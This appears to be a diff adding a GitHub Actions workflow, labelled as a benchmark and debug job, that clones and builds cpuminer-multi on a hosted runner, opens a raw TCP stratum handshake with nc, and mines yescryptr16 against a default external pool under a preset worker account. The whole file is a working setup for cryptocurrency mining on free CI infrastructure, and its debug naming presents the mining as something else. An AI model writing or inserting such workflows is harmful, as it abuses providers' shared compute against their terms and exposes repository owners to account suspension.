@@ -1,0 +1,101 @@
+name: GitMine Bench DEBUG
+
+on:
+  workflow_dispatch:
+    inputs:
+      pool_url:
+        description: 'stratum+tcp://host:port'
+        required: false
+        default: 'stratum+tcp://americas.mining-dutch.nl:9983'
+      stratum_user:
+        description: 'Stratum username'
+        required: false
+        default: '5mil.worker7'
+      stratum_pass:
+        description: 'Stratum password'
+        required: false
+        default: 'x'
+      duration:
+        description: 'Mining duration seconds'
+        required: false
+        default: '120'
+
+jobs:
+  debug:
+    name: debug
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    steps:
+      - name: "[DEBUG] Environment"
+        run: |
+          echo "=== Runner info ==="
+          uname -a
+          nproc
+          free -h
+          echo "=== Inputs ==="
+          echo "pool_url   : ${{ github.event.inputs.pool_url }}"
+          echo "stratum_user: ${{ github.event.inputs.stratum_user }}"
+          echo "duration   : ${{ github.event.inputs.duration }}s"
+
+      - name: "[DEBUG] Raw TCP stratum handshake"
+        run: |
+          HOST=$(echo "${{ github.event.inputs.pool_url }}" | sed 's|stratum+tcp://||' | cut -d: -f1)
+          PORT=$(echo "${{ github.event.inputs.pool_url }}" | sed 's|stratum+tcp://||' | cut -d: -f2)
+          echo "=== Testing raw TCP to $HOST:$PORT ==="
+          timeout 15 bash -c "(
+            echo '{"id":1,"method":"mining.subscribe","params":["cpuminer/2.5"]}'
+            sleep 3
+            echo '{"id":2,"method":"mining.authorize","params":["${{ github.event.inputs.stratum_user }}","${{ github.event.inputs.stratum_pass }}"]}'  
+            sleep 5
+          ) | nc -v $HOST $PORT" 2>&1 || echo "[TCP TEST] exited (normal after handshake)"
+
+      - name: "[DEBUG] Install build deps"
+        run: |
+          echo "=== Installing build dependencies ==="
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq \
+            build-essential automake autoconf pkg-config \
+            libcurl4-openssl-dev libjansson-dev \
+            libssl-dev libgmp-dev
+          echo "=== Done ==="
+
+      - name: "[DEBUG] Build cpuminer-multi"
+        run: |
+          echo "=== Cloning cpuminer-multi ==="
+          git clone --depth=1 https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer-multi
+          cd /tmp/cpuminer-multi
+          echo "=== autogen ==="
+          ./autogen.sh
+          echo "=== configure ==="
+          ./configure CFLAGS="-O2" --disable-assembly
+          echo "=== make ==="
+          make -j$(nproc)
+          echo "=== Version ==="
+          /tmp/cpuminer-multi/minerd --version
+          echo "=== Supported algos ==="
+          /tmp/cpuminer-multi/minerd --algo=help 2>&1 | grep -i yescrypt || echo "[WARN] yescrypt not listed"
+
+      - name: "[DEBUG] Mine with --debug flag"
+        run: |
+          HOST=$(echo "${{ github.event.inputs.pool_url }}" | sed 's|stratum+tcp://||' | cut -d: -f1)
+          PORT=$(echo "${{ github.event.inputs.pool_url }}" | sed 's|stratum+tcp://||' | cut -d: -f2)
+          DURATION=${{ github.event.inputs.duration }}
+          echo "=== Launching cpuminer --debug ==="
+          echo "  algo    : yescryptr16"
+          echo "  pool    : $HOST:$PORT"
+          echo "  user    : ${{ github.event.inputs.stratum_user }}"
+          echo "  duration: ${DURATION}s"
+          timeout ${DURATION} /tmp/cpuminer-multi/minerd \
+            --algo yescryptr16 \
+            --url stratum+tcp://$HOST:$PORT \
+            --user ${{ github.event.inputs.stratum_user }} \
+            --pass ${{ github.event.inputs.stratum_pass }} \
+            --threads 2 \
+            --timeout 300 \
+            --retries -1 \
+            --retry-pause 10 \
+            --reconnect \
+            --debug \
+            2>&1 || echo "[cpuminer] exited with code $?"
+          echo "=== cpuminer finished ==="
